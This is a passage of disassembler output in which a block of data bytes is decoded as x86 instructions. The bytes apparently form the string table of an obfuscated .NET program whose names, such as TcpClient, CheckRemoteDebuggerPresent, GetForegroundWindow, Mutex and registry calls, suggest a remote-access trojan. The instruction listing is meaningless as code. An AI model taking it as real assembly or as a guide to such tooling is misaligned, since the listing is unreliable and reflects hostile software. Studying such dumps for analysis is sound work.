  4099c6:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  4099cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4099cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4099cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4099ce:	65 63 74 00 61       	arpl   %esi,%gs:0x61(%eax,%eax,1)
  4099d3:	62 4e 4e             	bound  %ecx,0x4e(%esi)
  4099d6:	53                   	push   %ebx
  4099d7:	4a                   	dec    %edx
  4099d8:	70 76                	jo     0x409a50
  4099da:	61                   	popa
  4099db:	6f                   	outsl  %ds:(%esi),(%dx)
  4099dc:	68 41 64 74 00       	push   $0x746441
  4099e1:	47                   	inc    %edi
  4099e2:	65 74 00             	gs je  0x4099e5
  4099e5:	53                   	push   %ebx
  4099e6:	79 73                	jns    0x409a5b
  4099e8:	74 65                	je     0x409a4f
  4099ea:	6d                   	insl   (%dx),%es:(%edi)
  4099eb:	2e 4e                	cs dec %esi
  4099ed:	65 74 00             	gs je  0x4099f0
  4099f0:	54                   	push   %esp
  4099f1:	61                   	popa
  4099f2:	72 67                	jb     0x409a5b
  4099f4:	65 74 00             	gs je  0x4099f7
  4099f7:	53                   	push   %ebx
  4099f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4099f9:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4099fc:	74 00                	je     0x4099fe
  4099fe:	53                   	push   %ebx
  4099ff:	79 73                	jns    0x409a74
  409a01:	74 65                	je     0x409a68
  409a03:	6d                   	insl   (%dx),%es:(%edi)
  409a04:	2e 43                	cs inc %ebx
  409a06:	6f                   	outsl  %ds:(%esi),(%dx)
  409a07:	6c                   	insb   (%dx),%es:(%edi)
  409a08:	6c                   	insb   (%dx),%es:(%edi)
  409a09:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409a0e:	6e                   	outsb  %ds:(%esi),(%dx)
  409a0f:	73 2e                	jae    0x409a3f
  409a11:	49                   	dec    %ecx
  409a12:	45                   	inc    %ebp
  409a13:	6e                   	outsb  %ds:(%esi),(%dx)
  409a14:	75 6d                	jne    0x409a83
  409a16:	65 72 61             	gs jb  0x409a7a
  409a19:	74 6f                	je     0x409a8a
  409a1b:	72 2e                	jb     0x409a4b
  409a1d:	52                   	push   %edx
  409a1e:	65 73 65             	gs jae 0x409a86
  409a21:	74 00                	je     0x409a23
  409a23:	67 65 74 5f          	addr16 gs je 0x409a86
  409a27:	4f                   	dec    %edi
  409a28:	66 66 73 65          	data16 data16 jae 0x409a91
  409a2c:	74 00                	je     0x409a2e
  409a2e:	73 65                	jae    0x409a95
  409a30:	74 5f                	je     0x409a91
  409a32:	4f                   	dec    %edi
  409a33:	66 66 73 65          	data16 data16 jae 0x409a9c
  409a37:	74 00                	je     0x409a39
  409a39:	73 73                	jae    0x409aae
  409a3b:	67 4d                	addr16 dec %ebp
  409a3d:	66 69 57 46 51 78    	imul   $0x7851,0x46(%edi),%dx
  409a43:	45                   	inc    %ebp
  409a44:	69 67 74 00 53 70 6c 	imul   $0x6c705300,0x74(%edi),%esp
  409a4b:	69 74 00 45 78 69 74 	imul   $0x746978,0x45(%eax,%eax,1),%esi
  409a52:	00 
  409a53:	49                   	dec    %ecx
  409a54:	41                   	inc    %ecx
  409a55:	73 79                	jae    0x409ad0
  409a57:	6e                   	outsb  %ds:(%esi),(%dx)
  409a58:	63 52 65             	arpl   %edx,0x65(%edx)
  409a5b:	73 75                	jae    0x409ad2
  409a5d:	6c                   	insb   (%dx),%es:(%edi)
  409a5e:	74 00                	je     0x409a60
  409a60:	54                   	push   %esp
  409a61:	6f                   	outsl  %ds:(%esi),(%dx)
  409a62:	55                   	push   %ebp
  409a63:	70 70                	jo     0x409ad5
  409a65:	65 72 49             	gs jb  0x409ab1
  409a68:	6e                   	outsb  %ds:(%esi),(%dx)
  409a69:	76 61                	jbe    0x409acc
  409a6b:	72 69                	jb     0x409ad6
  409a6d:	61                   	popa
  409a6e:	6e                   	outsb  %ds:(%esi),(%dx)
  409a6f:	74 00                	je     0x409a71
  409a71:	57                   	push   %edi
  409a72:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409a76:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a7d:	74 5f                	je     0x409ade
  409a7f:	53                   	push   %ebx
  409a80:	73 6c                	jae    0x409aee
  409a82:	43                   	inc    %ebx
  409a83:	6c                   	insb   (%dx),%es:(%edi)
  409a84:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409a8b:	74 5f                	je     0x409aec
  409a8d:	53                   	push   %ebx
  409a8e:	73 6c                	jae    0x409afc
  409a90:	43                   	inc    %ebx
  409a91:	6c                   	insb   (%dx),%es:(%edi)
  409a92:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a99:	74 5f                	je     0x409afa
  409a9b:	54                   	push   %esp
  409a9c:	63 70 43             	arpl   %esi,0x43(%eax)
  409a9f:	6c                   	insb   (%dx),%es:(%edi)
  409aa0:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409aa7:	74 5f                	je     0x409b08
  409aa9:	54                   	push   %esp
  409aaa:	63 70 43             	arpl   %esi,0x43(%eax)
  409aad:	6c                   	insb   (%dx),%es:(%edi)
  409aae:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409ab5:	74 68                	je     0x409b1f
  409ab7:	65 6e                	outsb  %gs:(%esi),(%dx)
  409ab9:	74 69                	je     0x409b24
  409abb:	63 61 74             	arpl   %esp,0x74(%ecx)
  409abe:	65 41                	gs inc %ecx
  409ac0:	73 43                	jae    0x409b05
  409ac2:	6c                   	insb   (%dx),%es:(%edi)
  409ac3:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  409aca:	73 74                	jae    0x409b40
  409acc:	65 6d                	gs insl (%dx),%es:(%edi)
  409ace:	2e 4d                	cs dec %ebp
  409ad0:	61                   	popa
  409ad1:	6e                   	outsb  %ds:(%esi),(%dx)
  409ad2:	61                   	popa
  409ad3:	67 65 6d             	gs insl (%dx),%es:(%di)
  409ad6:	65 6e                	outsb  %gs:(%esi),(%dx)
  409ad8:	74 00                	je     0x409ada
  409ada:	45                   	inc    %ebp
  409adb:	6e                   	outsb  %ds:(%esi),(%dx)
  409adc:	76 69                	jbe    0x409b47
  409ade:	72 6f                	jb     0x409b4f
  409ae0:	6e                   	outsb  %ds:(%esi),(%dx)
  409ae1:	6d                   	insl   (%dx),%es:(%edi)
  409ae2:	65 6e                	outsb  %gs:(%esi),(%dx)
  409ae4:	74 00                	je     0x409ae6
  409ae6:	53                   	push   %ebx
  409ae7:	79 73                	jns    0x409b5c
  409ae9:	74 65                	je     0x409b50
  409aeb:	6d                   	insl   (%dx),%es:(%edi)
  409aec:	2e 43                	cs inc %ebx
  409aee:	6f                   	outsl  %ds:(%esi),(%dx)
  409aef:	6c                   	insb   (%dx),%es:(%edi)
  409af0:	6c                   	insb   (%dx),%es:(%edi)
  409af1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409af6:	6e                   	outsb  %ds:(%esi),(%dx)
  409af7:	73 2e                	jae    0x409b27
  409af9:	49                   	dec    %ecx
  409afa:	45                   	inc    %ebp
  409afb:	6e                   	outsb  %ds:(%esi),(%dx)
  409afc:	75 6d                	jne    0x409b6b
  409afe:	65 72 61             	gs jb  0x409b62
  409b01:	74 6f                	je     0x409b72
  409b03:	72 2e                	jb     0x409b33
  409b05:	67 65 74 5f          	addr16 gs je 0x409b68
  409b09:	43                   	inc    %ebx
  409b0a:	75 72                	jne    0x409b7e
  409b0c:	72 65                	jb     0x409b73
  409b0e:	6e                   	outsb  %ds:(%esi),(%dx)
  409b0f:	74 00                	je     0x409b11
  409b11:	47                   	inc    %edi
  409b12:	65 74 43             	gs je  0x409b58
  409b15:	75 72                	jne    0x409b89
  409b17:	72 65                	jb     0x409b7e
  409b19:	6e                   	outsb  %ds:(%esi),(%dx)
  409b1a:	74 00                	je     0x409b1c
  409b1c:	43                   	inc    %ebx
  409b1d:	68 65 63 6b 52       	push   $0x526b6365
  409b22:	65 6d                	gs insl (%dx),%es:(%edi)
  409b24:	6f                   	outsl  %ds:(%esi),(%dx)
  409b25:	74 65                	je     0x409b8c
  409b27:	44                   	inc    %esp
  409b28:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409b2c:	67 65 72 50          	addr16 gs jb 0x409b80
  409b30:	72 65                	jb     0x409b97
  409b32:	73 65                	jae    0x409b99
  409b34:	6e                   	outsb  %ds:(%esi),(%dx)
  409b35:	74 00                	je     0x409b37
  409b37:	67 65 74 5f          	addr16 gs je 0x409b9a
  409b3b:	52                   	push   %edx
  409b3c:	65 6d                	gs insl (%dx),%es:(%edi)
  409b3e:	6f                   	outsl  %ds:(%esi),(%dx)
  409b3f:	74 65                	je     0x409ba6
  409b41:	45                   	inc    %ebp
  409b42:	6e                   	outsb  %ds:(%esi),(%dx)
  409b43:	64 50                	fs push %eax
  409b45:	6f                   	outsl  %ds:(%esi),(%dx)
  409b46:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409b4d:	5f                   	pop    %edi
  409b4e:	43                   	inc    %ebx
  409b4f:	6f                   	outsl  %ds:(%esi),(%dx)
  409b50:	75 6e                	jne    0x409bc0
  409b52:	74 00                	je     0x409b54
  409b54:	67 65 74 5f          	addr16 gs je 0x409bb7
  409b58:	50                   	push   %eax
  409b59:	72 6f                	jb     0x409bca
  409b5b:	63 65 73             	arpl   %esp,0x73(%ebp)
  409b5e:	73 6f                	jae    0x409bcf
  409b60:	72 43                	jb     0x409ba5
  409b62:	6f                   	outsl  %ds:(%esi),(%dx)
  409b63:	75 6e                	jne    0x409bd3
  409b65:	74 00                	je     0x409b67
  409b67:	47                   	inc    %edi
  409b68:	65 74 50             	gs je  0x409bbb
  409b6b:	61                   	popa
  409b6c:	74 68                	je     0x409bd6
  409b6e:	52                   	push   %edx
  409b6f:	6f                   	outsl  %ds:(%esi),(%dx)
  409b70:	6f                   	outsl  %ds:(%esi),(%dx)
  409b71:	74 00                	je     0x409b73
  409b73:	50                   	push   %eax
  409b74:	61                   	popa
  409b75:	72 61                	jb     0x409bd8
  409b77:	6d                   	insl   (%dx),%es:(%edi)
  409b78:	65 74 65             	gs je  0x409be0
  409b7b:	72 69                	jb     0x409be6
  409b7d:	7a 65                	jp     0x409be4
  409b7f:	64 54                	fs push %esp
  409b81:	68 72 65 61 64       	push   $0x64616572
  409b86:	53                   	push   %ebx
  409b87:	74 61                	je     0x409bea
  409b89:	72 74                	jb     0x409bff
  409b8b:	00 43 6f             	add    %al,0x6f(%ebx)
  409b8e:	6e                   	outsb  %ds:(%esi),(%dx)
  409b8f:	76 65                	jbe    0x409bf6
  409b91:	72 74                	jb     0x409c07
  409b93:	00 46 61             	add    %al,0x61(%esi)
  409b96:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  409b9d:	54 
  409b9e:	6f                   	outsl  %ds:(%esi),(%dx)
  409b9f:	4c                   	dec    %esp
  409ba0:	69 73 74 00 53 79 73 	imul   $0x73795300,0x74(%ebx),%esi
  409ba7:	74 65                	je     0x409c0e
  409ba9:	6d                   	insl   (%dx),%es:(%edi)
  409baa:	2e 43                	cs inc %ebx
  409bac:	6f                   	outsl  %ds:(%esi),(%dx)
  409bad:	6c                   	insb   (%dx),%es:(%edi)
  409bae:	6c                   	insb   (%dx),%es:(%edi)
  409baf:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409bb4:	6e                   	outsb  %ds:(%esi),(%dx)
  409bb5:	73 2e                	jae    0x409be5
  409bb7:	49                   	dec    %ecx
  409bb8:	45                   	inc    %ebp
  409bb9:	6e                   	outsb  %ds:(%esi),(%dx)
  409bba:	75 6d                	jne    0x409c29
  409bbc:	65 72 61             	gs jb  0x409c20
  409bbf:	74 6f                	je     0x409c30
  409bc1:	72 2e                	jb     0x409bf1
  409bc3:	4d                   	dec    %ebp
  409bc4:	6f                   	outsl  %ds:(%esi),(%dx)
  409bc5:	76 65                	jbe    0x409c2c
  409bc7:	4e                   	dec    %esi
  409bc8:	65 78 74             	gs js  0x409c3f
  409bcb:	00 53 79             	add    %dl,0x79(%ebx)
  409bce:	73 74                	jae    0x409c44
  409bd0:	65 6d                	gs insl (%dx),%es:(%edi)
  409bd2:	2e 54                	cs push %esp
  409bd4:	65 78 74             	gs js  0x409c4b
  409bd7:	00 47 65             	add    %al,0x65(%edi)
  409bda:	74 57                	je     0x409c33
  409bdc:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409be3:	78 74                	js     0x409c59
  409be5:	00 4c 64 6a          	add    %cl,0x6a(%esp,%eiz,2)
  409be9:	41                   	inc    %ecx
  409bea:	45                   	inc    %ebp
  409beb:	64 58                	fs pop %eax
  409bed:	63 44 45 68          	arpl   %eax,0x68(%ebp,%eax,2)
  409bf1:	4e                   	dec    %esi
  409bf2:	75 00                	jne    0x409bf4
  409bf4:	61                   	popa
  409bf5:	4e                   	dec    %esi
  409bf6:	65 4f                	gs dec %edi
  409bf8:	69 61 73 54 58 75 00 	imul   $0x755854,0x73(%ecx),%esp
  409bff:	6e                   	outsb  %ds:(%esi),(%dx)
  409c00:	78 65                	js     0x409c67
  409c02:	51                   	push   %ecx
  409c03:	58                   	pop    %eax
  409c04:	6a 68                	push   $0x68
  409c06:	4c                   	dec    %esp
  409c07:	61                   	popa
  409c08:	59                   	pop    %ecx
  409c09:	75 00                	jne    0x409c0b
  409c0b:	4e                   	dec    %esi
  409c0c:	44                   	inc    %esp
  409c0d:	79 51                	jns    0x409c60
  409c0f:	43                   	inc    %ebx
  409c10:	6c                   	insb   (%dx),%es:(%edi)
  409c11:	64 54                	fs push %esp
  409c13:	63 5a 75             	arpl   %ebx,0x75(%edx)
  409c16:	00 6e 6f             	add    %ch,0x6f(%esi)
  409c19:	69 74 79 65 75 62 61 	imul   $0x74616275,0x65(%ecx,%edi,2),%esi
  409c20:	74 
  409c21:	64 61                	fs popa
  409c23:	75 00                	jne    0x409c25
  409c25:	53                   	push   %ebx
  409c26:	45                   	inc    %ebp
  409c27:	4e                   	dec    %esi
  409c28:	4c                   	dec    %esp
  409c29:	51                   	push   %ecx
  409c2a:	57                   	push   %edi
  409c2b:	59                   	pop    %ecx
  409c2c:	46                   	inc    %esi
  409c2d:	67 51                	addr16 push %ecx
  409c2f:	44                   	inc    %esp
  409c30:	64 75 00             	fs jne 0x409c33
  409c33:	4b                   	dec    %ebx
  409c34:	6d                   	insl   (%dx),%es:(%edi)
  409c35:	6a 59                	push   $0x59
  409c37:	58                   	pop    %eax
  409c38:	65 46                	gs inc %esi
  409c3a:	44                   	inc    %esp
  409c3b:	66 75 00             	data16 jne 0x409c3e
  409c3e:	58                   	pop    %eax
  409c3f:	44                   	inc    %esp
  409c40:	73 5a                	jae    0x409c9c
  409c42:	42                   	inc    %edx
  409c43:	74 77                	je     0x409cbc
  409c45:	68 75 67 75 00       	push   $0x756775
  409c4a:	63 6a 63             	arpl   %ebp,0x63(%edx)
  409c4d:	4d                   	dec    %ebp
  409c4e:	66 4c                	dec    %sp
  409c50:	6c                   	insb   (%dx),%es:(%edi)
  409c51:	6f                   	outsl  %ds:(%esi),(%dx)
  409c52:	62 6d 75             	bound  %ebp,0x75(%ebp)
  409c55:	00 4b 66             	add    %cl,0x66(%ebx)
  409c58:	47                   	inc    %edi
  409c59:	76 47                	jbe    0x409ca2
  409c5b:	45                   	inc    %ebp
  409c5c:	6d                   	insl   (%dx),%es:(%edi)
  409c5d:	6d                   	insl   (%dx),%es:(%edi)
  409c5e:	64 47                	fs inc %edi
  409c60:	55                   	push   %ebp
  409c61:	6d                   	insl   (%dx),%es:(%edi)
  409c62:	73 75                	jae    0x409cd9
  409c64:	00 74 71 46          	add    %dh,0x46(%ecx,%esi,2)
  409c68:	73 68                	jae    0x409cd2
  409c6a:	6e                   	outsb  %ds:(%esi),(%dx)
  409c6b:	47                   	inc    %edi
  409c6c:	53                   	push   %ebx
  409c6d:	75 75                	jne    0x409ce4
  409c6f:	00 59 64             	add    %bl,0x64(%ecx)
  409c72:	45                   	inc    %ebp
  409c73:	75 45                	jne    0x409cba
  409c75:	72 53                	jb     0x409cca
  409c77:	76 43                	jbe    0x409cbc
  409c79:	57                   	push   %edi
  409c7a:	63 76 00             	arpl   %esi,0x0(%esi)
  409c7d:	49                   	dec    %ecx
  409c7e:	6f                   	outsl  %ds:(%esi),(%dx)
  409c7f:	56                   	push   %esi
  409c80:	4d                   	dec    %ebp
  409c81:	78 61                	js     0x409ce4
  409c83:	46                   	inc    %esi
  409c84:	71 49                	jno    0x409ccf
  409c86:	54                   	push   %esp
  409c87:	55                   	push   %ebp
  409c88:	53                   	push   %ebx
  409c89:	45                   	inc    %ebp
  409c8a:	42                   	inc    %edx
  409c8b:	77 00                	ja     0x409c8d
  409c8d:	78 61                	js     0x409cf0
  409c8f:	65 73 6e             	gs jae 0x409d00
  409c92:	52                   	push   %edx
  409c93:	70 79                	jo     0x409d0e
  409c95:	6a 77                	push   $0x77
  409c97:	42                   	inc    %edx
  409c98:	70 49                	jo     0x409ce3
  409c9a:	77 00                	ja     0x409c9c
  409c9c:	52                   	push   %edx
  409c9d:	6f                   	outsl  %ds:(%esi),(%dx)
  409c9e:	52                   	push   %edx
  409c9f:	63 66 75             	arpl   %esp,0x75(%esi)
  409ca2:	41                   	inc    %ecx
  409ca3:	51                   	push   %ecx
  409ca4:	4a                   	dec    %edx
  409ca5:	77 00                	ja     0x409ca7
  409ca7:	51                   	push   %ecx
  409ca8:	6e                   	outsb  %ds:(%esi),(%dx)
  409ca9:	66 6f                	outsw  %ds:(%esi),(%dx)
  409cab:	4b                   	dec    %ebx
  409cac:	45                   	inc    %ebp
  409cad:	71 66                	jno    0x409d15
  409caf:	43                   	inc    %ebx
  409cb0:	41                   	inc    %ecx
  409cb1:	4f                   	dec    %edi
  409cb2:	4b                   	dec    %ebx
  409cb3:	77 00                	ja     0x409cb5
  409cb5:	43                   	inc    %ebx
  409cb6:	4c                   	dec    %esp
  409cb7:	48                   	dec    %eax
  409cb8:	67 70 48             	addr16 jo 0x409d03
  409cbb:	79 6b                	jns    0x409d28
  409cbd:	50                   	push   %eax
  409cbe:	45                   	inc    %ebp
  409cbf:	45                   	inc    %ebp
  409cc0:	4d                   	dec    %ebp
  409cc1:	77 00                	ja     0x409cc3
  409cc3:	77 62                	ja     0x409d27
  409cc5:	54                   	push   %esp
  409cc6:	4f                   	dec    %edi
  409cc7:	61                   	popa
  409cc8:	4a                   	dec    %edx
  409cc9:	51                   	push   %ecx
  409cca:	42                   	inc    %edx
  409ccb:	73 56                	jae    0x409d23
  409ccd:	52                   	push   %edx
  409cce:	77 00                	ja     0x409cd0
  409cd0:	73 49                	jae    0x409d1b
  409cd2:	58                   	pop    %eax
  409cd3:	7a 74                	jp     0x409d49
  409cd5:	6a 77                	push   $0x77
  409cd7:	61                   	popa
  409cd8:	6a 67                	push   $0x67
  409cda:	4e                   	dec    %esi
  409cdb:	6b 5a 77 00          	imul   $0x0,0x77(%edx),%ebx
  409cdf:	54                   	push   %esp
  409ce0:	67 6b 79 57 61       	imul   $0x61,0x57(%bx,%di),%edi
  409ce5:	6d                   	insl   (%dx),%es:(%edi)
  409ce6:	6e                   	outsb  %ds:(%esi),(%dx)
  409ce7:	69 45 46 61 77 00 56 	imul   $0x56007761,0x46(%ebp),%eax
  409cee:	6f                   	outsl  %ds:(%esi),(%dx)
  409cef:	47                   	inc    %edi
  409cf0:	74 6a                	je     0x409d5c
  409cf2:	64 50                	fs push %eax
  409cf4:	62 74 6a 77          	bound  %esi,0x77(%edx,%ebp,2)
  409cf8:	00 4f 58             	add    %cl,0x58(%edi)
  409cfb:	59                   	pop    %ecx
  409cfc:	75 5a                	jne    0x409d58
  409cfe:	4a                   	dec    %edx
  409cff:	7a 75                	jp     0x409d76
  409d01:	42                   	inc    %edx
  409d02:	6c                   	insb   (%dx),%es:(%edi)
  409d03:	77 00                	ja     0x409d05
  409d05:	7a 4a                	jp     0x409d51
  409d07:	43                   	inc    %ebx
  409d08:	62 4c 7a 6f          	bound  %ecx,0x6f(%edx,%edi,2)
  409d0c:	7a 76                	jp     0x409d84
  409d0e:	4b                   	dec    %ebx
  409d0f:	6f                   	outsl  %ds:(%esi),(%dx)
  409d10:	77 00                	ja     0x409d12
  409d12:	47                   	inc    %edi
  409d13:	65 74 46             	gs je  0x409d5c
  409d16:	6f                   	outsl  %ds:(%esi),(%dx)
  409d17:	72 65                	jb     0x409d7e
  409d19:	67 72 6f             	addr16 jb 0x409d8b
  409d1c:	75 6e                	jne    0x409d8c
  409d1e:	64 57                	fs push %edi
  409d20:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409d27:	65 74 5f             	gs je  0x409d89
  409d2a:	43                   	inc    %ebx
  409d2b:	72 65                	jb     0x409d92
  409d2d:	61                   	popa
  409d2e:	74 65                	je     0x409d95
  409d30:	4e                   	dec    %esi
  409d31:	6f                   	outsl  %ds:(%esi),(%dx)
  409d32:	57                   	push   %edi
  409d33:	69 6e 64 6f 77 00 6b 	imul   $0x6b00776f,0x64(%esi),%ebp
  409d3a:	53                   	push   %ebx
  409d3b:	73 4d                	jae    0x409d8a
  409d3d:	45                   	inc    %ebp
  409d3e:	6f                   	outsl  %ds:(%esi),(%dx)
  409d3f:	62 6d 75             	bound  %ebp,0x75(%ebp)
  409d42:	77 00                	ja     0x409d44
  409d44:	71 49                	jno    0x409d8f
  409d46:	54                   	push   %esp
  409d47:	6c                   	insb   (%dx),%es:(%edi)
  409d48:	41                   	inc    %ecx
  409d49:	6f                   	outsl  %ds:(%esi),(%dx)
  409d4a:	66 6d                	insw   (%dx),%es:(%edi)
  409d4c:	62 74 53 50          	bound  %esi,0x50(%ebx,%edx,2)
  409d50:	58                   	pop    %eax
  409d51:	48                   	dec    %eax
  409d52:	78 00                	js     0x409d54
  409d54:	44                   	inc    %esp
  409d55:	6b 64 52 6d 64       	imul   $0x64,0x6d(%edx,%edx,2),%esp
  409d5a:	79 58                	jns    0x409db4
  409d5c:	77 57                	ja     0x409db5
  409d5e:	46                   	inc    %esi
  409d5f:	4f                   	dec    %edi
  409d60:	78 00                	js     0x409d62
  409d62:	4d                   	dec    %ebp
  409d63:	55                   	push   %ebp
  409d64:	43                   	inc    %ebx
  409d65:	69 47 72 6e 4a 64 78 	imul   $0x78644a6e,0x72(%edi),%eax
  409d6c:	00 4d 75             	add    %cl,0x75(%ebp)
  409d6f:	74 65                	je     0x409dd6
  409d71:	78 00                	js     0x409d73
  409d73:	75 54                	jne    0x409dc9
  409d75:	52                   	push   %edx
  409d76:	6f                   	outsl  %ds:(%esi),(%dx)
  409d77:	75 62                	jne    0x409ddb
  409d79:	6a 66                	push   $0x66
  409d7b:	4f                   	dec    %edi
  409d7c:	70 6c                	jo     0x409dea
  409d7e:	58                   	pop    %eax
  409d7f:	43                   	inc    %ebx
  409d80:	79 00                	jns    0x409d82
  409d82:	49                   	dec    %ecx
  409d83:	6e                   	outsb  %ds:(%esi),(%dx)
  409d84:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409d8b:	65 
  409d8c:	41                   	inc    %ecx
  409d8d:	72 72                	jb     0x409e01
  409d8f:	61                   	popa
  409d90:	79 00                	jns    0x409d92
  409d92:	54                   	push   %esp
  409d93:	6f                   	outsl  %ds:(%esi),(%dx)
  409d94:	41                   	inc    %ecx
  409d95:	72 72                	jb     0x409e09
  409d97:	61                   	popa
  409d98:	79 00                	jns    0x409d9a
  409d9a:	67 65 74 5f          	addr16 gs je 0x409dfd
  409d9e:	41                   	inc    %ecx
  409d9f:	73 41                	jae    0x409de2
  409da1:	72 72                	jb     0x409e15
  409da3:	61                   	popa
  409da4:	79 00                	jns    0x409da6
  409da6:	67 65 74 5f          	addr16 gs je 0x409e09
  409daa:	4b                   	dec    %ebx
  409dab:	65 79 00             	gs jns 0x409dae
  409dae:	73 65                	jae    0x409e15
  409db0:	74 5f                	je     0x409e11
  409db2:	4b                   	dec    %ebx
  409db3:	65 79 00             	gs jns 0x409db6
  409db6:	43                   	inc    %ebx
  409db7:	72 65                	jb     0x409e1e
  409db9:	61                   	popa
  409dba:	74 65                	je     0x409e21
  409dbc:	53                   	push   %ebx
  409dbd:	75 62                	jne    0x409e21
  409dbf:	4b                   	dec    %ebx
  409dc0:	65 79 00             	gs jns 0x409dc3
  409dc3:	4f                   	dec    %edi
  409dc4:	70 65                	jo     0x409e2b
  409dc6:	6e                   	outsb  %ds:(%esi),(%dx)
  409dc7:	53                   	push   %ebx
  409dc8:	75 62                	jne    0x409e2c
  409dca:	4b                   	dec    %ebx
  409dcb:	65 79 00             	gs jns 0x409dce
  409dce:	67 65 74 5f          	addr16 gs je 0x409e31
  409dd2:	50                   	push   %eax
  409dd3:	75 62                	jne    0x409e37
  409dd5:	6c                   	insb   (%dx),%es:(%edi)
  409dd6:	69 63 4b 65 79 00 52 	imul   $0x52007965,0x4b(%ebx),%esp
  409ddd:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409de4:	4b 65 
  409de6:	79 00                	jns    0x409de8
  409de8:	6e                   	outsb  %ds:(%esi),(%dx)
  409de9:	50                   	push   %eax
  409dea:	6a 50                	push   $0x50
  409dec:	7a 78                	jp     0x409e66
  409dee:	43                   	inc    %ebx
  409def:	70 65                	jo     0x409e56
  409df1:	79 00                	jns    0x409df3
  409df3:	55                   	push   %ebp
  409df4:	62 73 77             	bound  %esi,0x77(%ebx)
  409df7:	49                   	dec    %ecx
  409df8:	4b                   	dec    %ebx
  409df9:	4b                   	dec    %ebx
  409dfa:	75 55                	jne    0x409e51
  409dfc:	4c                   	dec    %esp
  409dfd:	68 79 00 75 54       	push   $0x54750079
  409e02:	74 71                	je     0x409e75
  409e04:	66 6a 4e             	pushw  $0x4e
  409e07:	63 79 47             	arpl   %edi,0x47(%ecx)
  409e0a:	57                   	push   %edi
  409e0b:	57                   	push   %edi
  409e0c:	68 79 00 53 79       	push   $0x79530079
  409e11:	73 74                	jae    0x409e87
  409e13:	65 6d                	gs insl (%dx),%es:(%edi)
  409e15:	2e 53                	cs push %ebx
  409e17:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409e1b:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409e22:	70 
  409e23:	74 6f                	je     0x409e94
  409e25:	67 72 61             	addr16 jb 0x409e89
  409e28:	70 68                	jo     0x409e92
  409e2a:	79 00                	jns    0x409e2c
  409e2c:	55                   	push   %ebp
  409e2d:	78 69                	js     0x409e98
  409e2f:	6d                   	insl   (%dx),%es:(%edi)
  409e30:	53                   	push   %ebx
  409e31:	5a                   	pop    %edx
  409e32:	4b                   	dec    %ebx
  409e33:	47                   	inc    %edi
  409e34:	7a 68                	jp     0x409e9e
  409e36:	79 00                	jns    0x409e38
  409e38:	64 75 53             	fs jne 0x409e8e
  409e3b:	68 71 50 47 4b       	push   $0x4b475071
  409e40:	74 4d                	je     0x409e8f
  409e42:	70 68                	jo     0x409eac
  409e44:	69 79 00 56 62 65 6d 	imul   $0x6d656256,0x0(%ecx),%edi
  409e4b:	70 64                	jo     0x409eb1
  409e4d:	68 58 45 6a 79       	push   $0x796a4558
  409e52:	00 41 73             	add    %al,0x73(%ecx)
  409e55:	73 65                	jae    0x409ebc
  409e57:	6d                   	insl   (%dx),%es:(%edi)
  409e58:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409e5c:	41                   	inc    %ecx
  409e5d:	64 64 72 65          	fs fs jb 0x409ec6
  409e61:	73 73                	jae    0x409ed6
  409e63:	46                   	inc    %esi
  409e64:	61                   	popa
  409e65:	6d                   	insl   (%dx),%es:(%edi)
  409e66:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409e6d:	63 
  409e6e:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409e72:	79 00                	jns    0x409e74
  409e74:	54                   	push   %esp
  409e75:	6f                   	outsl  %ds:(%esi),(%dx)
  409e76:	42                   	inc    %edx
  409e77:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409e7e:	65 74 5f             	gs je  0x409ee0
  409e81:	53                   	push   %ebx
  409e82:	79 73                	jns    0x409ef7
  409e84:	74 65                	je     0x409eeb
  409e86:	6d                   	insl   (%dx),%es:(%edi)
  409e87:	44                   	inc    %esp
  409e88:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409e8f:	79 00                	jns    0x409e91
  409e91:	52                   	push   %edx
  409e92:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409e99:	00 6f 
  409e9b:	70 5f                	jo     0x409efc
  409e9d:	45                   	inc    %ebp
  409e9e:	71 75                	jno    0x409f15
  409ea0:	61                   	popa
  409ea1:	6c                   	insb   (%dx),%es:(%edi)
  409ea2:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  409ea9:	49 
  409eaa:	6e                   	outsb  %ds:(%esi),(%dx)
  409eab:	65 71 75             	gs jno 0x409f23
  409eae:	61                   	popa
  409eaf:	6c                   	insb   (%dx),%es:(%edi)
